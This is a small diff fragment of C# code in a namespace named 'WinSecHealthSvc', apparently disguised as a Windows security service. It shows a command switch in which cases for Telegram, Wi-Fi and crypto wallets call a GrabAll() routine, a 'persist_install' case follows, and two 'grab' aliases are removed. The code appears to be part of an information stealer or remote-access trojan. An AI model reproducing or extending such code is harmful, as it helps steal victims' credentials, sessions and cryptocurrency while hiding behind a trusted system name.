@@ -618,8 +618,6 @@ namespace WinSecHealthSvc
                     case "telegram":
                     case "wifi":
                     case "crypto_wallets":
-                    case "grabber":
-                    case "grab":
                         output = GrabAll();
                         break;
                     case "persist_install":
